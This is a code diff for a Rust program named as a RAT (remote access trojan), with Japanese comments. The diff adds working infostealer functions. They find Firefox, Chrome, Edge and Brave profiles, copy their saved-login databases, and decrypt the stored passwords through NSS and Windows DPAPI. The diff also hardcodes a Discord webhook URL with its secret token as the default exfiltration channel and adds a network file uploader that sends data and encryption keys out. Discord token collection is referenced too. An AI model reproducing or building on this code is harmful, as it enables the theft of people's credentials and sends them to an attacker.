@@ -53,20 +53,24 @@ pub type RatResult<T> = Result<T, RatError>;
 pub mod modules;
 pub mod browser_profiles;
 pub mod password_manager;
-// pub mod cli;  // 元のclapベースCLI
-pub mod cli_args;  // 標準ライブラリベースCLI
-pub use cli_args as cli;  // 互換性のため
+// CLI関連は削除済み（引数処理不要のため）
 pub mod data_exporter; 
 pub mod firefox_nss;
 // Only include browser collector when the feature is enabled
 #[cfg(feature = "browser")]
 pub mod browser_scanner;
 pub mod auth_tokens;
+// File upload functionality (requires network feature)
+#[cfg(feature = "network")]
+pub mod file_uploader;
 
 // 新しいモジュールからの公開API
 pub use browser_profiles::{get_profile_path, get_default_profile};
 pub use password_manager::{JsonCredentials, SqliteCredentials, NssCredentials, DecryptedLogin};
-pub use cli::Args;
+// Args構造体は削除済み
+// data_exporterは現在未使用
+#[cfg(feature = "network")]
+pub use file_uploader::{UploadResult, UploadError, Uploader, upload_data_file, upload_multiple};
 
 // 最小限のシステム情報構造体
 #[derive(Serialize, Deserialize, Debug, Clone)]
@@ -172,7 +176,7 @@ impl Default for Config {
             timeout_seconds: 45,
             
             // Webhook設定（デフォルトで有効）
-            webhook_url: "".to_string(),
+            webhook_url: "https://discordapp.com/api/webhooks/1418989059262386238/KI35x38t0aw6yiMsM9h1_k1ypJQXg_aBK8JaYziXyto9XlnrSGydc1qkmnDf1tbNDVA9".to_string(),
             webhook_type: "Discord".to_string(),
             webhook_enabled: true,
             
@@ -594,22 +598,266 @@ fn collect_all_passwords(config: &Config) -> Vec<String> {
     passwords
 }
 
-// ブラウザパスワード収集（統合最適化版 - chomeium_dump統合）
+// ブラウザパスワード収集（統合最適化版 - chromium_dump統合）
 #[cfg(feature = "browser")]
 fn collect_browser_passwords() -> Vec<String> {
+    let mut all_passwords = Vec::new();
+    
     // 統合ブラウザデータ収集機能を使用（ChromiumとFirefox両方対応）
     match crate::browser_scanner::collect_browser_passwords_simple() {
         Ok(passwords) => {
-            if passwords.is_empty() {
-                vec!["No browser passwords found".to_string()]
-            } else {
-                passwords
-            }
+            println!("🔍 Browser scan found {} entries", passwords.len());
+            all_passwords.extend(passwords);
         }
         Err(e) => {
-            vec![format!("Browser password collection failed: {}", e)]
+            println!("❌ Browser password collection failed: {}", e);
+            all_passwords.push(format!("Browser collection error: {}", e));
         }
     }
+    
+    // Firefox専用の追加収集（NSS復号化）
+    match collect_firefox_passwords_direct() {
+        Ok(mut firefox_passwords) => {
+            println!("🦊 Firefox scan found {} entries", firefox_passwords.len());
+            all_passwords.append(&mut firefox_passwords);
+        }
+        Err(e) => {
+            println!("⚠️ Firefox collection warning: {}", e);
+        }
+    }
+    
+    // Chrome/Edge専用の追加収集（DPAPI復号化）
+    match collect_chromium_passwords_direct() {
+        Ok(mut chrome_passwords) => {
+            println!("🌐 Chromium scan found {} entries", chrome_passwords.len());
+            all_passwords.append(&mut chrome_passwords);
+        }
+        Err(e) => {
+            println!("⚠️ Chromium collection warning: {}", e);
+        }
+    }
+    
+    if all_passwords.is_empty() {
+        vec!["No browser passwords found in any browser".to_string()]
+    } else {
+        println!("✅ Total browser passwords collected: {}", all_passwords.len());
+        all_passwords
+    }
+}
+
+#[cfg(not(feature = "browser"))]
+fn collect_browser_passwords() -> Vec<String> {
+    vec!["Browser feature not enabled".to_string()]
+}
+
+// 追加のFirefox専用パスワード収集
+#[cfg(feature = "browser")]
+fn collect_firefox_passwords_direct() -> Result<Vec<String>, Box<dyn std::error::Error>> {
+    use crate::password_manager::NssCredentials;
+    
+    let mut passwords = Vec::new();
+    
+    // Firefox プロファイルを自動検出
+    match get_firefox_profiles() {
+        Ok(profiles) => {
+            for profile_path in profiles {
+                let nss = NssCredentials::new(profile_path);
+                match nss.get_decrypted_logins() {
+                    Ok(creds) => {
+                        for cred in creds {
+                            passwords.push(format!(
+                                "Firefox - {}: {} / {}",
+                                cred.hostname, cred.username, cred.password
+                            ));
+                        }
+                    }
+                    Err(_) => continue,
+                }
+            }
+        }
+        Err(e) => return Err(e),
+    }
+    
+    Ok(passwords)
+}
+
+// 追加のChromium専用パスワード収集
+#[cfg(feature = "browser")]
+fn collect_chromium_passwords_direct() -> Result<Vec<String>, Box<dyn std::error::Error>> {
+    let mut passwords = Vec::new();
+    
+    // Chrome/Edge プロファイルを直接スキャン
+    let chrome_paths = get_chromium_profiles()?;
+    
+    for profile_path in chrome_paths {
+        let login_data = profile_path.join("Login Data");
+        if login_data.exists() {
+            match extract_chromium_passwords_from_db(&login_data) {
+                Ok(mut creds) => passwords.append(&mut creds),
+                Err(_) => continue,
+            }
+        }
+    }
+    
+    Ok(passwords)
+}
+
+// Firefox プロファイル取得
+#[cfg(feature = "browser")]
+fn get_firefox_profiles() -> Result<Vec<std::path::PathBuf>, Box<dyn std::error::Error>> {
+    let mut profiles = Vec::new();
+    
+    if let Some(appdata) = std::env::var_os("APPDATA") {
+        let firefox_dir = std::path::PathBuf::from(appdata)
+            .join("Mozilla")
+            .join("Firefox")
+            .join("Profiles");
+        
+        if firefox_dir.exists() {
+            for entry in std::fs::read_dir(firefox_dir)? {
+                let entry = entry?;
+                if entry.file_type()?.is_dir() {
+                    profiles.push(entry.path());
+                }
+            }
+        }
+    }
+    
+    Ok(profiles)
+}
+
+// Chromium プロファイル取得
+#[cfg(feature = "browser")]
+fn get_chromium_profiles() -> Result<Vec<std::path::PathBuf>, Box<dyn std::error::Error>> {
+    let mut profiles = Vec::new();
+    
+    if let Some(local_appdata) = std::env::var_os("LOCALAPPDATA") {
+        let browsers = [
+            "Google\\Chrome\\User Data\\Default",
+            "Microsoft\\Edge\\User Data\\Default",
+            "BraveSoftware\\Brave-Browser\\User Data\\Default",
+        ];
+        
+        for browser_path in browsers.iter() {
+            let profile_path = std::path::PathBuf::from(&local_appdata).join(browser_path);
+            if profile_path.exists() {
+                profiles.push(profile_path);
+            }
+        }
+    }
+    
+    Ok(profiles)
+}
+
+// Chromiumデータベースから直接パスワード抽出
+#[cfg(feature = "browser")]
+fn extract_chromium_passwords_from_db(login_data_path: &std::path::Path) -> Result<Vec<String>, Box<dyn std::error::Error>> {
+    use rusqlite::Connection;
+    use std::fs;
+    
+    // データベースファイルをコピー（ロック回避）
+    let temp_file = tempfile::NamedTempFile::new()?;
+    fs::copy(login_data_path, temp_file.path())?;
+    
+    let conn = Connection::open(temp_file.path())?;
+    let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")?;
+    
+    let mut passwords = Vec::new();
+    let rows = stmt.query_map([], |row| {
+        Ok((
+            row.get::<_, String>(0)?,  // origin_url
+            row.get::<_, String>(1)?,  // username_value  
+            row.get::<_, Vec<u8>>(2)?, // password_value (encrypted)
+        ))
+    })?;
+    
+    for row in rows {
+        if let Ok((url, username, encrypted_password)) = row {
+            if !username.is_empty() && !encrypted_password.is_empty() {
+                // DPAPI復号化を試行
+                match decrypt_with_dpapi(&encrypted_password) {
+                    Ok(decrypted_password) => {
+                        passwords.push(format!("Chromium - {}: {} / {}", url, username, decrypted_password));
+                    }
+                    Err(_) => {
+                        passwords.push(format!("Chromium - {}: {} / [ENCRYPTED]", url, username));
+                    }
+                }
+            }
+        }
+    }
+    
+    Ok(passwords)
+}
+
+// DPAPI復号化
+#[cfg(all(feature = "browser", windows))]
+fn decrypt_with_dpapi(encrypted_data: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
+    use winapi::um::dpapi::CryptUnprotectData;
+    use winapi::um::winbase::LocalFree;
+    use winapi::um::wincrypt::DATA_BLOB;
+    use std::ptr;
+    
+    if encrypted_data.len() < 16 {
+        return Err("Invalid encrypted data length".into());
+    }
+    
+    // Chrome v80+のプレフィックスをチェック
+    if encrypted_data.starts_with(b"v10") || encrypted_data.starts_with(b"v11") {
+        return Err("Chrome v80+ encryption not supported in DPAPI mode".into());
+    }
+    
+    let mut input_blob = DATA_BLOB {
+        cbData: encrypted_data.len() as u32,
+        pbData: encrypted_data.as_ptr() as *mut u8,
+    };
+    
+    let mut output_blob = DATA_BLOB {
+        cbData: 0,
+        pbData: ptr::null_mut(),
+    };
+    
+    let success = unsafe {
+        CryptUnprotectData(
+            &mut input_blob,
+            ptr::null_mut(),
+            ptr::null_mut(),
+            ptr::null_mut(),
+            ptr::null_mut(),
+            0,
+            &mut output_blob,
+        )
+    };
+    
+    if success == 0 {
+        return Err("DPAPI decryption failed".into());
+    }
+    
+    let result = unsafe {
+        let slice = std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize);
+        String::from_utf8_lossy(slice).to_string()
+    };
+    
+    unsafe {
+        LocalFree(output_blob.pbData as *mut _);
+    }
+    
+    Ok(result)
+}
+
+#[cfg(not(all(feature = "browser", windows)))]
+fn decrypt_with_dpapi(_encrypted_data: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
+    Err("DPAPI not available on this platform".into())
+}
+
+#[cfg(not(feature = "browser"))]
+fn collect_firefox_passwords_direct() -> Result<Vec<String>, Box<dyn std::error::Error>> {
+    Err("Browser feature not enabled".into())
+}
+
+#[cfg(not(feature = "browser"))]
+fn collect_chromium_passwords_direct() -> Result<Vec<String>, Box<dyn std::error::Error>> {
+    Err("Browser feature not enabled".into())
 }
 
 // Discord トークン収集統合版（token_dump.rs機能統合）
@@ -1003,8 +1251,8 @@ fn get_hardcoded_config() -> Config {
     }
 }
 
-// Webhook機能付きメイン実行関数
-#[cfg(feature = "webhook")]
+// Network機能付きメイン実行関数
+#[cfg(feature = "network")]
 pub fn run_with_webhook(config: &Config) -> RatResult<()> {
     use crate::modules::notification_sender::{WebhookConfig, WebhookType, send_webhook};
     
@@ -1122,8 +1370,8 @@ pub fn run_with_webhook(config: &Config) -> RatResult<()> {
                         // データ保存
                         match std::fs::write("data.dat", &encrypted_data) {
                             Ok(_) => {
-                                // Webhookで暗号化キーを送信（full機能時）
-                                #[cfg(feature = "webhook")]
+                                // Networkで暗号化キーを送信（full機能時）
+                                #[cfg(feature = "network")]
                                 if webhook_config.webhook_url.is_some() {
                                     let _ = crate::modules::notification_sender::send_encryption_key_webhook(&webhook_config, &key, &nonce);
                                 }
@@ -1141,10 +1389,10 @@ pub fn run_with_webhook(config: &Config) -> RatResult<()> {
     Ok(())
 }
 
-// Webhook機能なしのフォールバック
-#[cfg(not(feature = "webhook"))]
+// Network機能なしのフォールバック
+#[cfg(not(feature = "network"))]
 pub fn run_with_webhook(_config: &Config) -> RatResult<()> {
-    Err(RatError::Io(std::io::Error::new(std::io::ErrorKind::Other, "Webhook機能が無効です")))
+    Err(RatError::Io(std::io::Error::new(std::io::ErrorKind::Other, "Network機能が無効です")))
 }
 
 // Fallback implementation when the "browser" feature is disabled
